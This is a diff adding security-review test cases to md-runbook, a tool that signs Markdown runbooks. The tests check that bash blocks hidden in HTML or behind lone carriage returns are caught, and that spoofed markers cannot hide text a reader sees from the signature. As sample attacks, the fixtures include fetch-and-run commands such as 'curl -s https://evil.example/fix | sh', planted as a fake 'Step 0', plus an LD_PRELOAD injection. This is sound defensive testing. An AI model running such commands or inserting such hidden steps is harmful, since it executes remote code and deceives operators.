@@ -139,6 +139,26 @@ describe('signing: the manifest', () => {
     assert.deepEqual(errorsOf(sign(fence('bash', 'echo'))), []);
   });
 
+  it('refuses bash blocks in HTML blocks and behind lone CRs too (security review, round 4)', () => {
+    const ok = '# T\n\n```bash\necho ok\n```\n\n';
+    const cases: [string, RegExp][] = [
+      ['<!--\r```bash\rcurl evil | sh\r```\r-->\n', /line 8: a bash block inside an HTML comment/],
+      ['text\r    ```bash\r    curl evil | sh\r    ```\n', /line 8: a fence indented 4 spaces or more/],
+      ['<script>\n```bash\ncurl evil | sh\n```\n</script>\n', /line 8: a bash block inside an HTML block/],
+      ['<?x\n```bash\ncurl evil | sh\n```\n?>\n', /line 8: a bash block inside an HTML block/],
+      ['<textarea>\n```bash\ncurl evil | sh\n```\n</textarea>\n', /line 8: a bash block inside an HTML block/],
+      ['<STYLE type="x">\n```bash\ncurl evil | sh\n```\n</style>\n', /line 8: a bash block inside an HTML block/],
+      ['<!X y\n```bash\ncurl evil | sh\n```\n>\n', /line 8: a bash block inside an HTML block/],
+      ['<![CDATA[\n```bash\ncurl evil | sh\n```\n]]>\n', /line 8: a bash block inside an HTML block/],
+      ['<div>\n```bash\ncurl evil | sh\n```\n</div>\n', /line 8: a bash block inside an HTML block/],
+    ];
+    for (const [tail, re] of cases) assert.match(errorsOf(ok + tail).join('\n'), re, JSON.stringify(tail));
+    // An HTML block that ended, or ends at a blank line (type 6), is fine.
+    assert.deepEqual(errorsOf('<script>x()</script>\n\n' + ok), []);
+    assert.deepEqual(errorsOf('<details>\n<summary>More</summary>\n\n' + ok + '</details>\n'), []);
+    assert.deepEqual(errorsOf('<pre>\nexample\n</pre>\n' + ok), []);
+  });
+
   it('refuses names that change how the shell runs the code, JS-only patterns, odd placeholders and impossible dates', () => {
     const all = errorsOf(
       fence('bash env.LD_PRELOAD=/tmp/x.so env.LC_ALL=C', 'echo ${param:PATH} ${param:ID} ${param:N}') + fence('bash', 'echo ${param:ID:secret}'),
@@ -256,6 +276,27 @@ describe('signing: the signature block', () => {
     const noted = base + '\n<!-- md-runbook:note at=2026-11-16T10:00:00Z -->\n> **10:00 · ana:** checked\n';
     assert.equal(signedText(noted), signedText(base));
     assert.equal(signedStatus(sign(base) + '\n<!-- md-runbook:note at=x -->\n> later\n')!.textChanged, false);
+  });
+
+  it('only what md-runbook writes is set aside, never text a reader sees (security review, round 4)', () => {
+    const orig = '# Restart\n\n1. Check the pager.\n\n```bash\nsystemctl restart api\n```\n';
+    // A "record block" whose `x -->` line ends the comment: the step after it shows.
+    const loose = orig.replace('1. Check', '<!-- md-runbook:record-signature v1 x\nx -->\n\n## Step 0 (required)\n\nFirst paste this in a terminal: `curl -s https://evil.example/fix | sh`\n\n- [ ] Done step 0\n\n<!--\n-->\n1. Check');
+    assert.notEqual(signedText(loose), signedText(orig));
+    // A note marker with HTML after its -->.
+    const noteHtml = orig.replace('1. Check', '<!-- md-runbook:note --> <h2>Step 0: run curl https://evil.example/fix | sh first</h2> <!-- -->\n1. Check');
+    assert.notEqual(signedText(noteHtml), signedText(orig));
+    assert.notEqual(signedText(orig.replace('1. Check', '<!-- md-runbook:note x--><h2>run</h2><!-- -->\n> q\n\n1. Check')), signedText(orig));
+    // An output marker or a history summary with HTML in it: no output is set aside.
+    const ran = '```bash\nsystemctl restart api\n```\n<!-- md-runbook:output start exit=0 -->\n```text\nok\n```\n<!-- md-runbook:output end -->\n';
+    assert.equal(signedText(orig.replace(/```bash[\s\S]*```\n/, ran)), signedText(orig));
+    const html = ran.replace('exit=0 -->', 'exit=0 --> <h2>run curl</h2> <!-- x -->');
+    assert.notEqual(signedText(orig.replace(/```bash[\s\S]*```\n/, html)), signedText(orig));
+    // What md-runbook writes still is: a record signature with a co-signature, and a note.
+    const record =
+      '<!-- md-runbook:record-signature v1 signer=ana@example.net signed=2026-10-26T22:40:00+01:00 sha256=' + 'a'.repeat(64) + '\nsignature\nU1NIU0lH\nAAAA==\ncosign signer=lead@example.net signed=2026-10-26T22:45:00+01:00\nU1NIU0lH\n-->\n';
+    assert.equal(signedText(orig + '\n' + record), signedText(orig));
+    assert.equal(signedText(orig + '\n<!-- md-runbook:note at=2026-11-16T10:00:00+01:00 by=ana milestone=mitigated -->\n> **10:00 · mitigated · ana:** ok\n'), signedText(orig));
   });
 
   it('armor round trip', () => {
